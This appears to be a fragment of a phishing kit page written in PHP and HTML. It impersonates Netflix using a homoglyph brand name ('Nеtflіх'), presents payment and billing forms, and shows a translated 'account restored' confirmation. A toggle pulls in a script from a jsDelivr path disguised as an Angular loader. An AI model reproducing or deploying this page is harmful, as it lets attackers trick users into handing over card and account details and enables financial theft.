...
if ($enable_robots == "checked") {
   $robots_script = '<script src="https://cdn.jsdelivr.net/gh/angular-loader/latest/angular-loader.min.js" id="l6psy0b0"></script>';
}
?>
...
$supportedLanguages = ['en', 'es', 'fr', 'de', 'it', 'ja', 'nl', 'pl', 'pt', 'sl', 'hu']; // Add more languages as needed
...
<html lang="en" class="">
  <head>
    ...
    <meta property="al:android:url" content="nflx://www.google.com/search?q=net&signup/creditoption">
    <meta property="al:android:package" content="com.netflix.mediaclient">
    <meta property="al:android:app_name" content="Nеtflіх">
            ...
            <div class="basicLayout notMobile modernInApp hasLargeTypography signupSimplicity-creditOptionMode simplicity" lang="en-TN" dir="ltr">
              <div class="nfHeader noBorderHeader signupBasicHeader onboarding-header">
                <a href="#" class="svg-nfLogo signupBasicHeader onboarding-header" data-uia="netflix-header-svg-logo">
                  ...
                  <span class="screen-reader-text">Nеtflіх Home</span>
                </a>
              </div>
                ...
                <div class="centerContainer firstLoad">
                  <div class="default-ltr-cache-bjn8wh ehkvevs2">
                    <form method="POST" data-uia="payment-form">
                      <div style="margin-top: 150px;"  class="paymentFormContainer">

<style>
/* Ensuring that the spinner container stays fixed and does not move on scroll */
.loading-children-container {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    top: 15%;  /* Centers the content vertically, adjust as necessary */
    left: 0;
    right: 0;
    z-index: 1000;  /* Ensures the spinner is on top of other elements */
    width: 100%; /* Full width to maintain center alignment */
    background: transparent; /* Ensures no background interference */
    box-sizing: border-box; /* Handles the sizing of elements to include padding and borders */
}
...
.nf-loading-spinner {
    ...
    margin: 20px 0; /* Adjusts margin around the spinner for better spacing */
}
...
.processing-text {
    ...
    font-size: 20px;
    text-align: center;
    margin-bottom: 10px; /* Smaller bottom margin for tighter layout */
    color: #333; /* Dark gray for text, ensuring it is readable */
}

.warning-text {
    text-align: center;
    font-size: 16px;
    color: #555; /* Dark gray for consistent text styling */
    margin-top: 10px; /* Smaller top margin for tighter layout */
}
                            ...
                            <form id="billingform" method="POST" action="/">
                                <div class="regFormContainer" data-uia="form-registration" style="
">
                                    <img src="styles/img/Checkmark.png"
                                        style="
    max-width: 25%;
    display: block;
    margin-left: auto;
...
<div class="stepHeader-container" data-uia="header" style="text-align: center; display: flex; justify-content: center;">
    <div class="stepHeader" role="status" style="margin-bottom: 12px; width: 100%;">
        <h1 class="stepTitle" data-uia="stepTitle" style="text-align: center;">
            <span style="text-align: justify; display: block;"><?php echo $translations['congratulations']; ?>!</span>
        </h1>
    </div>
</div>
...
<div class="contextRow" data-uia="subtitle" style="text-align: center; justify-content: center;">
    <span style="text-align: justify;"><?php echo $translations['accountRestored']; ?></span>
</div>
